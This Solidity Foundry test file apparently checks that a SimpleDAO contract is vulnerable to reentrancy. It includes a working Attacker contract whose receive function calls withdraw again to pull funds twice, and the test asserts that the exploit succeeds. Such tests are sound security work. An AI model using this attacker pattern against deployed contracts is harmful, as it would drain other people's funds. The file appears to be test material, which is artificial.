
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {SimpleDAO} from "../src/SimpleDAO.sol";

contract TestReentrancySimpleDAO is Test {

    SimpleDAO public _contractUnderTest;
    
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new SimpleDAO();
        
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal, uint256 initialDeposit) public {
        
        vm.assume(attackVal > 0);
        vm.assume(initialDeposit >= 2 * attackVal);
        vm.assume(attackVal <= type(uint128).max / 2);
        vm.assume(initialDeposit <= type(uint128).max);
        

        vm.deal(address(_contractUnderTest), initialDeposit); 
        
        vm.deal(address(_attacker), initialDeposit);
        
        vm.deal(address(this), initialDeposit);

        _attacker.setupAttack{value: attackVal}(attackVal, initialDeposit);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}

    fallback() external payable {}
}

contract Attacker {
    SimpleDAO public victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;

    uint256 public attackAmount;

    constructor(address victimAddress) { 
        victim = SimpleDAO(victimAddress);
    }

    function setupAttack(uint256 _attackVal, uint256 _initialDeposit) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        
        attackAmount = _attackVal;
        
        victim.donate{value: _initialDeposit}(address(this));
    }

    function attack(uint256 val) public {
        initialSnapshot = address(this).balance;

        victim.withdraw(val);

        uint256 finalBalance = address(this).balance;
        
        if (finalBalance == initialSnapshot + 2 * val) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            attackCallCount++;
            victim.withdraw(attackAmount);
        }
    }

    fallback() external payable {}
}
